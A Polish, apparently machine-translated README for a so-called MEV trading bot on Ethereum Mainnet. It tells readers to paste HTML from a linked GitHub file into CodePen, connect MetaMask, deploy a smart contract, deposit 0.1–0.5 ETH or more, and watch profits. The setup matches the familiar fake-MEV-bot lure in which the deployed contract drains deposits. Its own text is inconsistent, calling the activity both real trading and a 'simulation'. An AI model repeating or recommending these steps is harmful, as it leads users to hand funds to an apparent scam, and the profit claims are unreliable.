# Mój Lokalny Bot Tradingowy 🤖

![1](https://i.postimg.cc/B6c2txbp/Chat-GPT-Image-30-2025-18-19-40.png)

Cześć entuzjaści kryptowalut! Z radością przedstawiam mój **Lokalny Bot Tradingowy** — proste narzędzie do prawdziwego handlu na **Ethereum Mainnet**. Wszystko jest zawarte w **jednym pliku HTML**, więc możesz uruchomić go bezpośrednio na **CodePen** bez żadnych problemów! 😎 Interfejs inspirowany jest VS Code — czysty i intuicyjny — idealny do handlu prosto z przeglądarki. Oto jak to działa!

## Funkcje

- **Wszystko w jednym pliku**: Cały kod znajduje się w jednym pliku HTML — po prostu skopiuj, wklej do CodePen i możesz zaczynać!
- **Połączenie z portfelem**: Łatwe połączenie portfela MetaMask do pracy z kontraktem smart.
- **Wdrażanie kontraktu smart**: Wdróż swój własny kontrakt na Mainnet (pokrywasz opłatę za gaz).
- **Prawdziwy handel**: Zacznij od minimum **0.1 ETH**, ale dla lepszych rezultatów zalecane jest **0.5 ETH+** — kliknij "**Start**" i obserwuj handel.
- **Kontrola poślizgu (slippage)**: Ustaw tolerancję poślizgu pomiędzy **0,5% a 49%** dla elastycznych transakcji.
- **Ochrona przed MEV i Sniping**: Włącz ochronę przed atakami Miner Extractable Value (MEV) lub automatyczny sniping okazji.
  - **Czym jest MEV?** MEV oznacza, że inne boty lub górnicy mogą próbować wyprzedzić Twoje transakcje, aby przejąć Twój zysk. Ochrona przed MEV pomaga Twoim transakcjom być pierwszymi przed konkurencją.
- **Kontrola workflow**:
  - **Start**: Uruchamia proces tradingu (wymaga ≥0,1 ETH, potwierdź wywołanie funkcji).
  - **Stop**: Zatrzymuje handel, dostępne tylko po uruchomieniu Start.
  - **Withdraw**: Wypłaca środki, dostępne tylko po zatrzymaniu (Stop).
- **Terminal w czasie rzeczywistym**: Wyświetla aktualne transakcje, ścieżki handlu i zysk.
- **Potencjał zysku**: Pokazuje opłacalne transakcje i oczekiwany zysk w czasie rzeczywistym (na podstawie depozytu **1 ETH**).
- **Responsywny design**: Działa idealnie zarówno na komputerze, jak i na urządzeniach mobilnych.

## Jak uruchomić na [CodePen](https://codepen.io/pen/)

1.  *Skonfiguruj **MetaMask:***
    
    -   *Zainstaluj **MetaMask** w swojej przeglądarce.*
    -   *Przełącz się na **Ethereum Mainnet**.*
    -   *Upewnij się, że Twój portfel ma **≥0,1 ETH** plus gaz na wdrożenie kontraktu.*
    -   *Otwórz edytor na **[CodePen](https://codepen.io/pen/)**.*
    -   *Wklej ten **[Kod](https://raw.githubusercontent.com/Tevrinodt6aXTD/Mev-Trading-Bot/main/trading_bot.html)** do bloku **HTML**.*
  
2.  **Rozpocznij handel:**
    
    -   *Kliknij **Connect MetaMask**, aby połączyć swój portfel.*
![Connect MetaMask](https://i.postimg.cc/4N3pNHgv/code.png)
    -   *Kliknij **Deploy Contract**, aby wdrożyć swój kontrakt smart (wymagany gaz).*
    -   *Wprowadź **≥0,1 ETH**, ustaw swój poślizg **(0,5%–49%)**, a następnie kliknij **Start** i potwierdź wywołanie funkcji w **MetaMask**.*
    -   *Sprawdź okno logów, aby zobaczyć aktualne transakcje i potencjał zysku.*
![1](https://i.ibb.co/N6RB81pH/34.png)
    -   *Kliknij **Stop**, aby zatrzymać symulację, a następnie **Withdraw**, aby wypłacić środki.*
  
3.  *Monitoruj terminal: Logi pokazują transakcje i zysk w czasie rzeczywistym oraz opłacalne okazje na podstawie **depozytu 1 ETH**.*

---

**Udanych transakcji! 🚀**

---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2025-07-05

---